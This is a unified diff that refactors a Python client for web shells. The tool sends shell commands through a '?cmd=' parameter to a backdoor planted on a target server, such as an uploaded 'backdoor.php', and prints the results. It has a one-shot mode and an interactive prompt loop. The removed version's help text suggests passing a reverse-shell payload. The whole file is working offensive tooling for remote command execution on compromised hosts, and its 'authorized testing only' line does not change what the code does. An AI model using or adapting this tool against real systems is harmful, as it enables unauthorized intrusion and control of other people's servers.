@@ -1,21 +1,111 @@
-import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
-parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
-parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
-parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
-parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
-args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
-if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
-    parser.print_help() # shows help menu
-elif args.target and args.payload: # elif (if they both have values do some action)
-    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
-if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
-    os.system("clear") # clear the screen (linux)
-    while True: # starts a while loop (never ending loop)
-        try: # try statement
-            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
-            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
-            time.sleep(0.3) # waits 0.3 seconds during each request
-        except requests.exceptions.InvalidSchema: # error handling
-            print("Invalid URL Schema: http:// or https://")
-        except requests.exceptions.ConnectionError: # error handling
-            print("URL is invalid")
+#!/usr/bin/env python3
+"""Interactive web-shell client for ?cmd= style backdoors.
+
+Sends GET requests with a `cmd` parameter (or attacker-controlled name via --param)
+and prints the response body. Supports a one-shot payload (`--payload`) or an
+interactive REPL (`--interactive`).
+
+Usage:
+    # one-shot
+    python3 web_shell.py -t http://target/backdoor.php -p "id"
+
+    # interactive
+    python3 web_shell.py -t http://target/backdoor.php --interactive
+
+Authorized testing only.
+"""
+import argparse
+import os
+import sys
+import time
+
+import requests
+
+
+def fetch(session: requests.Session, target: str, param: str, payload: str,
+          timeout: float) -> str | None:
+    try:
+        r = session.get(target, params={param: payload}, timeout=timeout)
+    except requests.exceptions.SSLError as exc:
+        print(f"[!] TLS error: {exc} (use --no-ssl-verify to disable verification)", file=sys.stderr)
+        return None
+    except requests.exceptions.InvalidSchema:
+        print("[!] Invalid URL schema: use http:// or https://", file=sys.stderr)
+        return None
+    except requests.exceptions.ConnectionError as exc:
+        print(f"[!] Connection error: {exc}", file=sys.stderr)
+        return None
+    except requests.exceptions.Timeout:
+        print(f"[!] Timeout after {timeout}s", file=sys.stderr)
+        return None
+    except requests.exceptions.RequestException as exc:
+        print(f"[!] Request error: {exc}", file=sys.stderr)
+        return None
+    return r.text
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser.add_argument("-t", "--target", required=True,
+                        help="Target URL, e.g. http://10.0.0.1:3001/uploads/backdoor.php")
+    parser.add_argument("-p", "--payload", help="Single command to execute (one-shot mode)")
+    parser.add_argument("--param", default="cmd", help="Query-parameter name (default: cmd)")
+    parser.add_argument("--interactive", "-i", action="store_true",
+                        help="Drop into interactive REPL after optional --payload run")
+
+    verify_group = parser.add_mutually_exclusive_group()
+    verify_group.add_argument("--ssl-verify", dest="ssl_verify", action="store_true",
+                              help="Verify TLS certificates (default)")
+    verify_group.add_argument("--no-ssl-verify", dest="ssl_verify", action="store_false",
+                              help="Skip TLS verification (testing self-signed targets)")
+    parser.set_defaults(ssl_verify=True)
+
+    parser.add_argument("--timeout", type=float, default=15.0,
+                        help="Per-request timeout in seconds (default: 15)")
+    parser.add_argument("--proxy", default=None, help="HTTP(S) proxy URL")
+    parser.add_argument("--delay", type=float, default=0.3,
+                        help="Seconds to sleep between interactive requests (default: 0.3)")
+    args = parser.parse_args()
+
+    session = requests.Session()
+    session.verify = args.ssl_verify
+    if args.proxy:
+        session.proxies = {"http": args.proxy, "https": args.proxy}
+    if not args.ssl_verify:
+        # Suppress the noisy InsecureRequestWarning when --no-ssl-verify is intentional.
+        try:
+            from urllib3.exceptions import InsecureRequestWarning
+            import urllib3
+            urllib3.disable_warnings(InsecureRequestWarning)
+        except ImportError:
+            pass
+
+    if args.payload:
+        text = fetch(session, args.target, args.param, args.payload, args.timeout)
+        if text is not None:
+            print(text)
+        if not args.interactive:
+            return 0
+
+    if args.interactive or not args.payload:
+        if args.interactive:
+            os.system("clear" if os.name != "nt" else "cls")
+        try:
+            while True:
+                try:
+                    cmd = input("$ ")
+                except EOFError:
+                    return 0
+                text = fetch(session, args.target, args.param, cmd, args.timeout)
+                if text is not None:
+                    print(text)
+                time.sleep(args.delay)
+        except KeyboardInterrupt:
+            print("\n[!] Interrupted.", file=sys.stderr)
+            return 130
+
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
